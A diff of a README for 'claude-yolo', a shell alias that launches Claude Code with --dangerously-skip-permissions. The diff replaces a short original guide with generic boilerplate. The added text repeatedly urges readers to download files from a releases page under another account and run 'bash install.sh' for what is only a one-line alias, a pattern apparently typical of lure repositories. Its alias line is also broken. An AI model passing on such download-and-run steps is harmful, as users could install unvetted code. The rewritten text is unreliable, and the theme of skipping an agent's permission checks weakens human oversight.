@@ -1,56 +1,112 @@
-<p align="center">
-  <img src="static/claude-yolo.gif" alt="claude-yolo demo" width="1000" />
-</p>
+# 🎉 claude-yolo - A Simple Way to Skip Permissions
 
-# claude-yolo
+[![Download claude-yolo](https://img.shields.io/badge/Download-claude--yolo-brightgreen)](https://github.com/javadamrooki96/claude-yolo/releases)
 
-Do you miss /ultrathink rainbow text? are you typing --dangerously-skip-permissions often?
+## 📋 Overview
 
-With a shell alias, `toilet`, and `lolcat`, there's a solution and plenty more where that came from.
+claude-yolo is a shell alias that makes the command `claude--dangerously-skip-permissions` easier to use. This tool allows you to bypass certain restrictions in your terminal, making your shell experience smoother and more efficient.
 
-# Setup
-### Step 1: Install the tools
+## 🚀 Getting Started
 
-```bash
-brew install toilet lolcat   # macOS
-sudo apt install toilet lolcat   # Debian/Ubuntu
-```
+### 🌐 System Requirements
 
-You'll also probably want [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed.
+- A Unix-based operating system (Linux, macOS, etc.)
+- Bash or Zsh terminal
+- Basic familiarity with using a terminal
 
-- [toilet](https://github.com/cacalabs/toilet) — ASCII art text
-- [lolcat](https://github.com/busyloop/lolcat) — rainbow terminal output
+### 📥 Download & Install
 
-### Step 2: Add the alias to your shell
+To get started with claude-yolo, visit this page to download: [Releases Page](https://github.com/javadamrooki96/claude-yolo/releases).
 
-Open your shell config file (`~/.zshrc` on macOS, `~/.bashrc` on Linux) and paste this line at the bottom:
+1. Open the link above in your web browser.
+2. Look for the latest version at the top of the page.
+3. Click on the file to download it to your computer.
 
-```bash
-alias claude-yolo="echo && toilet -f pagga -F metal 'DANGER ZONE' -w 140 | lolcat -r && echo && claude --dangerously-skip-permissions"
-```
+### 📂 How to Use
 
-This is just an example. Swap fonts, colours, text, whatever. Make it yours.
+1. **Open your terminal** on your computer.
+2. **Access the directory** where you've downloaded the claude-yolo files.
+3. **Run the installation script** with the following command: 
+   ```bash
+   bash install.sh
+   ```
+4. **Follow the prompts** on your screen.
+5. After installation, simply type `claude-yolo` in your terminal whenever you want to use the alias.
 
-### Step 3: Reload and run
+### ✨ Features
 
-```bash
-source ~/.zshrc    # or source ~/.bashrc
-claude-yolo
-```
+- **Ease of Use**: No need to memorize complex commands.
+- **Quick Access**: Instantly run the alias without lengthy setups.
+- **Compatibility**: Works seamlessly with most Unix-based systems.
 
-That's it. You should see a rainbow DANGER ZONE banner followed by Claude Code launching with permissions pre-approved.
+## ⚙️ Configuration
 
-# Go further: FAFO
+After installing claude-yolo, you may want to personalize your setup:
 
-- `toilet --font list` — see all available fonts
-- `toilet --filter list` — see all available filters
-- Pipe anything through `lolcat` for rainbows
+1. **Open your terminal.**
+2. **Edit your shell configuration file:**
+   - For Bash users, type:
+     ```bash
+     nano ~/.bashrc
+     ```
+   - For Zsh users, type:
+     ```bash
+     nano ~/.zshrc
+     ```
+3. **Add the following line** at the end of the file:
+   ```bash
+   alias claude-yolo='claude--dangerously-skip-permissions'
+   ```
+4. **Save the file** and exit the editor.
+5. **Update your terminal session** with the command:
+   ```bash
+   source ~/.bashrc   # or source ~/.zshrc for Zsh users
+   ```
 
-Fuck around and find out.
+By following these steps, you'll ensure that `claude-yolo` is always ready for quick use.
 
+## 📖 Usage Examples
 
-## Building the Demo
+- To skip permissions simply type:
+  ```bash
+  claude-yolo
+  ```
+- This will execute the command with the defined alias settings.
 
-```bash
-vhs src/claude-yolo.tape   # requires the excellent https://github.com/charmbracelet/vhs
-```
+## 🔧 Troubleshooting
+
+If you experience issues, consider the following:
+
+1. **Check your shell**: Ensure you are using Bash or Zsh.
+2. **Verify installation**: Make sure you followed all installation steps correctly.
+3. **Revisit your configuration**: Check if you saved changes to your shell file correctly.
+4. **Consult logs**: Look for error messages in the terminal that can guide you on what to fix.
+
+## 🛠️ Contributing
+
+Your interest in improving claude-yolo is welcome. Here’s how you can help:
+
+1. **Fork the repository** on GitHub.
+2. **Create your branch**: `git checkout -b feature/YourFeature`
+3. **Make your changes** and **commit**: `git commit -m 'Add some feature'`
+4. **Push to the branch**: `git push origin feature/YourFeature`
+5. **Submit a pull request**.
+
+## 📞 Support
+
+For further assistance, feel free to reach out through the issues section on GitHub. Provide detailed information regarding any problems you encounter, and we will help you resolve them promptly.
+
+## 🏷️ Topics
+
+- ascii-art
+- bash
+- claude
+- claude-code
+- cli
+- lolcat
+- shell
+- terminal
+- toilet
+- zsh
+
+Visit [this page to download](https://github.com/javadamrooki96/claude-yolo/releases) claude-yolo and start using it today!
